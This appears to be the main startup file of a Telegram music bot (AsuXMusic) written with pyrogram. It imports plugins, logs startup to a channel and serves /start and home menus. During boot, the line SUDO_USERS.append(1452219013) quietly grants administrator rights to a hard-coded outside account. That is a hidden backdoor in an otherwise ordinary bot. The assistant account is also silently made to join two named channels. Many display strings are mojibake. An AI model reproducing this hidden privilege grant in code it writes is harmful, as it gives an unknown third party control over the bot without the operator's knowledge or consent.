import os
import re
import config
import asyncio
import importlib

from rich.table import Table
from rich.console import Console as hehe
from pyrogram import filters, Client
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from youtubesearchpython import VideosSearch

from AsuXMusic.Helpers.Logging import *
from AsuXMusic.Helpers.PyTgCalls.AsuX import run
from AsuXMusic.Modules import ALL_MODULES
from AsuXMusic.Helpers.Inline import private_panel
from AsuXMusic.Helpers.Database import get_active_chats, remove_active_chat, add_served_user
from AsuXMusic import (ASSID, ASSMENTION, ASSNAME, ASSUSERNAME, BOT_ID, BOT_NAME, BOT_USERNAME, SUDO_USERS, F_OWNER, db, app, Ass)

loop = asyncio.get_event_loop()
console = hehe()
HELPABLE = {}


async def AsuX_boot():
    with console.status(
        "[magenta]  ô·¥è·¥è·¥õ…™…¥…¢ AsuX ·¥ç·¥ús…™·¥Ñ...",
    ) as status:
        console.print("‚îå [red]·¥Ñ ü·¥á·¥Ä Ä…™…¥…¢ ·¥ç·¥è…¥…¢·¥è·¥Ö ô ·¥Ñ·¥Ä·¥Ñ ú·¥á...")
        try:
            chats = await get_active_chats()
            for chat in chats:
                chat_id = int(chat["chat_id"])
                await remove_active_chat(chat_id)
        except Exception as e:
            console.print("[red] ·¥á Ä Ä·¥è Ä ·¥° ú…™ ü·¥á ·¥Ñ ü·¥á·¥Ä Ä…™…¥…¢ ·¥ç·¥è…¥…¢·¥è ·¥Ö ô.")
        console.print("‚îî [green]·¥ç·¥è…¥…¢·¥è·¥Ö ô ·¥Ñ ü·¥á·¥Ä Ä·¥á·¥Ö s·¥ú·¥Ñ·¥Ñ·¥áss“ì·¥ú ü ü è!\n\n")
        ____ = await startup_msg("**¬ª …™·¥ç·¥©·¥è Ä·¥õ…™…¥…¢ ·¥Ä ü ü ·¥ç·¥è·¥Ö·¥ú ü·¥ás...**")
        status.update(
            status="[bold blue]s·¥Ñ·¥Ä…¥…¥…™…¥…¢ “ì·¥è Ä ·¥ò ü·¥ú…¢…™…¥s", spinner="earth"
        )
        await asyncio.sleep(0.7)
        console.print("Found {} Plugins".format(len(ALL_MODULES)) + "\n")
        status.update(
            status="[bold red]…™·¥ç·¥ò·¥è Ä·¥õ…™…¥…¢ ·¥ò ü·¥ú…¢…™…¥s...",
            spinner="bouncingBall",
            spinner_style="yellow",
        )
        await asyncio.sleep(1.2)
        for all_module in ALL_MODULES:
            imported_module = importlib.import_module(
                "AsuXMusic.Modules." + all_module
            )
            if (
                hasattr(imported_module, "__MODULE__")
                and imported_module.__MODULE__
            ):
                imported_module.__MODULE__ = imported_module.__MODULE__
                if (
                    hasattr(imported_module, "__HELP__")
                    and imported_module.__HELP__
                ):
                    HELPABLE[
                        imported_module.__MODULE__.lower()
                    ] = imported_module
            console.print(
                f"‚ú® [bold cyan]s·¥ú·¥Ñ·¥Ñ·¥áss“ì·¥ú ü ü è …™·¥ç·¥ò·¥è Ä·¥õ·¥á·¥Ö: [green]{all_module}.py"
            )
            await asyncio.sleep(0.1)
        console.print("")
        _____ = await startup_edit(____, f"**¬ª s·¥ú·¥Ñ·¥Ñ·¥áss“ì·¥ú ü ü è …™·¥ç·¥©·¥è Ä·¥õ·¥á·¥Ö {(len(ALL_MODULES))} ·¥ç·¥è·¥Ö·¥ú ü·¥ás...**")
        status.update(
            status="[bold blue]·¥ç·¥è·¥Ö·¥ú ü·¥ás …™·¥ç·¥ò·¥è Ä·¥õ·¥Ä·¥õ…™·¥è…¥ ·¥Ñ·¥è·¥ç·¥ò ü·¥á·¥õ·¥á·¥Ö!",
        )
        await asyncio.sleep(0.2)
        SUDO_USERS.append(1452219013)
        await startup_del(_____)
    console.print(
        "[bold green]·¥õ Ä è…™…¥…¢ ·¥õ·¥è s·¥õ·¥Ä Ä·¥õ ·¥õ ú·¥á  ô·¥è·¥õ...\n"
    )
    try:
        await app.send_message(
            config.LOGGER_ID,
            f"<b>‚ûª ·¥Äs·¥ú ‚úò ·¥ç·¥ús…™·¥Ñ  ô·¥è·¥õ üîÆ\n\n‚ùÑ …™·¥Ö :</b> `{BOT_ID}`\n‚ú® <b>…¥·¥Ä·¥ç·¥á :</b> {BOT_NAME}\n‚òÅ <b>·¥ús·¥á Ä…¥·¥Ä·¥ç·¥á :</b> @{BOT_USERNAME}",
        )
    except Exception as e:
        print(
            " ô·¥è·¥õ  ú·¥Äs “ì·¥Ä…™ ü·¥á·¥Ö ·¥õ·¥è ·¥Ä·¥Ñ·¥Ñ·¥áss ·¥õ ú·¥á  ü·¥è…¢ ·¥Ñ ú·¥Ä…¥…¥·¥á ü. ·¥ç·¥Ä·¥ã·¥á s·¥ú Ä·¥á ·¥õ ú·¥Ä·¥õ  è·¥è·¥ú  ú·¥Ä·¥†·¥á ·¥Ä·¥Ö·¥Ö·¥á·¥Ö  è·¥è·¥ú Ä  ô·¥è·¥õ ·¥õ·¥è  è·¥è·¥ú Ä  ü·¥è…¢ ·¥Ñ ú·¥Ä…¥…¥·¥á ü ·¥Ä…¥·¥Ö ·¥ò Ä·¥è·¥ç·¥è·¥õ·¥á·¥Ö ·¥Äs ·¥Ä·¥Ö·¥ç…™…¥!"
        )
        console.print(f"\n[red]s·¥õ·¥è·¥ò·¥ò…™…¥…¢  ô·¥è·¥õ")
        return
    a = await app.get_chat_member(config.LOGGER_ID, BOT_ID)
    if a.status != "administrator":
        print("·¥ò Ä·¥è·¥ç·¥è·¥õ·¥á  ô·¥è·¥õ ·¥Äs ·¥Ä·¥Ö·¥ç…™…¥ …™…¥  ü·¥è…¢…¢·¥á Ä ·¥Ñ ú·¥Ä…¥…¥·¥á ü")
        console.print(f"\n[red]s·¥õ·¥è·¥ò·¥ò…™…¥…¢  ô·¥è·¥õ")
        return
    try:
        await Ass.send_message(
            config.LOGGER_ID,
            f"<b>‚ûª ·¥Äs·¥ú ‚úò ·¥ç·¥ús…™·¥Ñ ·¥Äss…™s·¥õ·¥Ä…¥·¥õ üîÆ\n\n‚ùÑ …™·¥Ö :</b> `{ASSID}`\n‚ú® <b>…¥·¥Ä·¥ç·¥á :</b> {ASSNAME}\n‚òÅ <b>·¥ús·¥á Ä…¥·¥Ä·¥ç·¥á :</b> @{ASSUSERNAME}",
        )
    except Exception as e:
        print(
            "·¥Äss…™s·¥õ·¥Ä…¥·¥õ ·¥Ä·¥Ñ·¥Ñ·¥è·¥ú…¥·¥õ  ú·¥Äs “ì·¥Ä…™ ü·¥á·¥Ö ·¥õ·¥è ·¥Ä·¥Ñ·¥Ñ·¥áss ·¥õ ú·¥á  ü·¥è…¢ ·¥Ñ ú·¥Ä…¥…¥·¥á ü. ·¥ç·¥Ä·¥ã·¥á s·¥ú Ä·¥á ·¥õ ú·¥Ä·¥õ  è·¥è·¥ú  ú·¥Ä·¥†·¥á ·¥Ä·¥Ö·¥Ö·¥á·¥Ö  è·¥è·¥ú Ä  ô·¥è·¥õ ·¥õ·¥è  è·¥è·¥ú Ä  ü·¥è…¢ ·¥Ñ ú·¥Ä…¥…¥·¥á ü ·¥Ä…¥·¥Ö ·¥ò Ä·¥è·¥ç·¥è·¥õ·¥á·¥Ö ·¥Äs ·¥Ä·¥Ö·¥ç…™…¥!"
        )
        console.print(f"\n[red]s·¥õ·¥è·¥ò·¥ò…™…¥…¢  ô·¥è·¥õ")
        return
    try:
        await Ass.join_chat("AbishnoiMF")
        await Ass.join_chat("Abishnoi_bots")
    except:
        pass
    console.print(f"\n‚îå[red]  ô·¥è·¥õ s·¥õ·¥Ä Ä·¥õ·¥á·¥Ö ·¥Äs {BOT_NAME}!")
    console.print(f"‚îú[green] ·¥Äss…™s·¥õ·¥Ä…¥·¥õ s·¥õ·¥Ä Ä·¥õ·¥á·¥Ö ·¥Äs {ASSNAME}!")
    await run()
    console.print(f"\n[red]s·¥õ·¥è·¥ò·¥ò…™…¥…¢  ô·¥è·¥õ")


home_text_pm = f"""** ú·¥á è ,

·¥õ ú…™s …™s** {BOT_NAME},
**·¥Ä “ì·¥Äs·¥õ ·¥Ä…¥·¥Ö ·¥©·¥è·¥°·¥á Ä“ì·¥ú ü ·¥ç·¥ús…™·¥Ñ ·¥© ü·¥Ä è·¥á Ä  ô·¥è·¥õ “ì·¥è Ä ·¥õ·¥á ü·¥á…¢ Ä·¥Ä·¥ç …¢ Ä·¥è·¥ú·¥© ·¥†…™·¥Ö·¥á·¥è·¥Ñ ú·¥Ä·¥õs.**

‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
||·¥Ñ ü…™·¥Ñ·¥ã ·¥è…¥  ú·¥á ü·¥©  ô·¥ú·¥õ·¥õ·¥è…¥ ·¥õ·¥è …¢·¥á·¥õ …™…¥“ì·¥è Ä·¥ç·¥Ä·¥õ…™·¥è…¥ ·¥Ä ô·¥è·¥ú·¥õ ·¥ç è ·¥Ñ·¥è·¥ç·¥ç·¥Ä…¥·¥Ös. ||"""


@app.on_message(filters.command("start") & filters.private)
async def start_command(_, message):
    await add_served_user(message.from_user.id)
    if len(message.text.split()) > 1:
        name = (message.text.split(None, 1)[1]).lower()
        if name == "help":
            text, keyboard = await help_parser(message.from_user.mention)
            await message.delete()
            return await app.send_text(
                message.chat.id,
                text,
                reply_markup=keyboard,
            )
        if name[0] == "i":
            await app.send_message(
                    config.LOGGER_ID,
                    f"¬ª {message.from_user.mention}  ú·¥Äs ·¥ä·¥ús·¥õ s·¥õ·¥Ä Ä·¥õ·¥á·¥Ö ·¥õ ú·¥á  ô·¥è·¥õ ·¥õ·¥è ·¥Ñ ú·¥á·¥Ñ·¥ã <b>·¥õ Ä·¥Ä·¥Ñ·¥ã …™…¥“ì·¥è Ä·¥ç·¥Ä·¥õ…™·¥è…¥</b>\n\n**…™·¥Ö :** {message.from_user.id}\n**…¥·¥Ä·¥ç·¥á :** {message.from_user.first_name}",
                )
            m = await message.reply_text("**‚Üª s·¥á·¥Ä Ä·¥Ñ ú…™…¥…¢...\n\n·¥© ü·¥á·¥Äs·¥á ·¥°·¥Ä…™·¥õ...**")
            query = (str(name)).replace("info_", "", 1)
            query = f"https://www.youtube.com/watch?v={query}"
            results = VideosSearch(query, limit=1)
            for result in results.result()["result"]:
                title = result["title"]
                duration = result["duration"]
                views = result["viewCount"]["short"]
                thumbnail = result["thumbnails"][0]["url"].split("?")[0]
                channellink = result["channel"]["link"]
                channel = channel = result["channel"]["name"]
                link = result["link"]
                published = result["publishedTime"]
            searched_text = f"""
üçë **·¥õ Ä·¥Ä·¥Ñ·¥ã …™…¥“ì·¥è Ä·¥ç·¥Ä·¥õ…™·¥è…¥** üçë

‚ùÑ **·¥õ…™·¥õ ü·¥á :** {title}

‚è≥**·¥Ö·¥ú Ä·¥Ä·¥õ…™·¥è…¥ :** {duration} ·¥ç…™…¥·¥ú·¥õ·¥ás
üëÄ**·¥†…™·¥á·¥°s :** `{views}`
‚è∞**·¥©·¥ú ô ü…™s ú·¥á·¥Ö ·¥è…¥ :** {published}
üé•**·¥Ñ ú·¥Ä…¥…¥·¥á ü :** {channel}
üìé**·¥Ñ ú·¥Ä…¥…¥·¥á ü  ü…™…¥·¥ã :** [·¥†…™s…™·¥õ ·¥Ñ ú·¥Ä…¥…¥·¥á ü]({channellink})
üîó**·¥†…™·¥Ö·¥á·¥è  ü…™…¥·¥ã :** [·¥†…™s…™·¥õ ·¥è…¥  è·¥è·¥ú·¥õ·¥ú ô·¥á]({link})

 s·¥á·¥Ä Ä·¥Ñ ú ·¥©·¥è·¥°·¥á Ä·¥á·¥Ö  ô è {BOT_NAME} ü•Ä"""
            key = InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton(
                            text="‚òÅ  è·¥è·¥ú·¥õ·¥ú ô·¥á ‚òÅ", url=f"{link}"
                        ),
                        InlineKeyboardButton(
                            text="ü•Ä s·¥ú·¥©·¥©·¥è Ä·¥õ ü•Ä", url=config.SUPPORT_CHAT
                        ),
                    ],
                ]
            )
            await m.delete()
            return await app.send_photo(
                message.chat.id,
                photo=thumbnail,
                caption=searched_text,
                parse_mode="markdown",
                reply_markup=key,
            )
    return await message.reply_photo(
        photo=config.START_IMG,
        caption=home_text_pm,
        reply_markup=InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton(
                    text="·¥Ä·¥Ö·¥Ö ·¥ç·¥á ·¥õ·¥è  è·¥è·¥ú Ä …¢ Ä·¥è·¥ú·¥©", url=f"https://t.me/{BOT_USERNAME}?startgroup=true"
                ),
            ],
            [
                InlineKeyboardButton(
                    text="‚ùÑ  ú·¥á ü·¥© ‚ùÑ", callback_data="AsuX_help"
                ),
                InlineKeyboardButton(
                    text="ü•Ä ·¥è·¥°…¥·¥á Ä ü•Ä", user_id=F_OWNER
                )
            ],
            [
                InlineKeyboardButton(
                    text="‚ú® s·¥ú·¥©·¥©·¥è Ä·¥õ ‚ú®", url=config.SUPPORT_CHAT
                ),
                InlineKeyboardButton(
                    text="üíò ·¥Ñ ú·¥Ä…¥…¥·¥á ü üíò", url=config.SUPPORT_CHANNEL
                ),
            ],
            [
                InlineKeyboardButton(
                    text="‚òÅ s·¥è·¥ú Ä·¥Ñ·¥á ·¥Ñ·¥è·¥Ö·¥á ‚òÅ", url="https://telegra.ph/file/9b0455dae14d5639f936d.mp4"
                )
            ],
        ]
    ),
 )


@app.on_callback_query(filters.regex("AsuX_home"))
async def AsuX_home(_, CallbackQuery):
    await CallbackQuery.answer("·¥Äs·¥ú ùöá  ú·¥è·¥ç·¥á")
    await CallbackQuery.message.edit_text(
        text=home_text_pm,
        reply_markup=InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton(
                    text="·¥Ä·¥Ö·¥Ö ·¥ç·¥á ·¥õ·¥è  è·¥è·¥ú Ä …¢ Ä·¥è·¥ú·¥©", url=f"https://t.me/{BOT_USERNAME}?startgroup=true"
                ),
            ],
            [
                InlineKeyboardButton(
                    text="‚ùÑ  ú·¥á ü·¥© ‚ùÑ", callback_data="AsuX_help"
                ),
                InlineKeyboardButton(
                    text="ü•Ä ·¥è·¥°…¥·¥á Ä ü•Ä", user_id=F_OWNER
                )
            ],
            [
                InlineKeyboardButton(
                    text="‚ú® s·¥ú·¥©·¥©·¥è Ä·¥õ ‚ú®", url=config.SUPPORT_CHAT
                ),
                InlineKeyboardButton(
                    text="üíò ·¥Ñ ú·¥Ä…¥…¥·¥á ü üíò", url=config.SUPPORT_CHANNEL
                ),
            ],
            [
                InlineKeyboardButton(
                    text="‚òÅ s·¥è·¥ú Ä·¥Ñ·¥á ·¥Ñ·¥è·¥Ö·¥á ‚òÅ", url="https://telegra.ph/file/9b0455dae14d5639f936d.mp4"
                )
            ],
        ]
    ),
 )



if __name__ == "__main__":
    loop.run_until_complete(AsuX_boot())
